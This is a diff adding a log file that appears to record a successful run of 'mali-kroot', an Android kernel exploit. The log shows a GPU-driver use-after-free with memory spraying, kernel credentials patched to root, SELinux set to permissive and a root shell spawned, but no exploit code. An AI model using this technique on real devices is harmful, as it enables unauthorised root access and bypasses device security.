@@ -1,0 +1,47 @@
+﻿[*] kroot pid=2358
+[i] ram span=4294967296 bytes memstart=80000000 (map [80000000,180000000))
+[+] pre-arm pressure buffer resident (128MB)
+[i] after pressure: MemAvailable:    2160976 kB | MemFree:          753712 kB
+[*] attempt 1/4
+[+] UAF armed + alias prefaulted
+[+] chunk base=0x75de600000 span=30720MB
+[i] pressure_fill start npress=0 free=753356kB avail=2160620kB
+[i]  press=1 free=687852kB avail=2095116kB
+[i]  press=2 free=622024kB avail=2029288kB
+[i]  press=3 free=556568kB avail=1963832kB
+[i]  press=4 free=490740kB avail=1898004kB
+[i]  press=5 free=425280kB avail=1832544kB
+[i]  press=6 free=359436kB avail=1766700kB
+[i]  press=7 free=293964kB avail=1701228kB
+[i]  press=8 free=228120kB avail=1635384kB
+[i]  press=9 free=162648kB avail=1569912kB
+[i]  press=10 free=96804kB avail=1504068kB
+[i]  press=11 free=32084kB avail=1438580kB
+[i] spray round 0 (chunks 0..2047) press=11 avail=1471116kB
+[+] validated pg=0x0 probe=9 pte=1600000818b0fd3 (live PTE page confirmed)
+[+] cand pg=0x0 i=113 slots=145/0 lines=18/0 high=0xe8000000000000 low=0xf53
+[i] released pressure, avail=2298592 kB
+[i] after spray: MemAvailable:    2299204 kB | MemFree:          899240 kB
+[i] memstart_addr=80000000
+[i] kimage_voffset=ffffff7f88000000
+[i] init_task comm='swapper/0' cred=ffffff800972c0c0 real_cred=ffffff800972c0c0 tasks.next=ffffffc0fa8f84d8 tasks.prev=ffffffc07169b058
+[i] task[0] ffffffc07169ab80 comm='kbase_event' cred=ffffffc0f9bdff00
+[i] task[1] ffffffc0d3a90000 comm='mali-kroot' cred=ffffffc0f9378540
+[+] found task ffffffc0d3a90000 cred=ffffffc0f9378540 real_cred=ffffffc0f9378540
+[i] cred ffffffc0f9378540 uid=2000 gid=0
+[i] cred gid=2000 euid=2000 egid=2000 fsuid=2000
+[+] cred patched (readback uid=0 gid=0 cap_eff=3fffffffff)
+[i] parent task=ffffffc0e0214880 comm='adbd' cred=ffffffc0f9be6900 real_cred=ffffffc0f9be6900
+[i] cred ffffffc0f9be6900 uid=2000 gid=0
+[i] cred gid=2000 euid=2000 egid=2000 fsuid=2000
+[+] cred patched (readback uid=0 gid=0 cap_eff=3fffffffff)
+[i] selinux_state bytes: 00 01 00 01
+[+] selinux enforcing now: 00 00 00 01
+[i] getuid=0 geteuid=0 getgid=0
+[+] releasing mappings
+[+] spawning root shell
+uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),1078(ext_data_rw),1079(ext_obb_rw),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid),3012 context=u:r:shell:s0
+Permissive
+0
+ROOTPROOF_0_Permissive
+[+] shell exited status=0
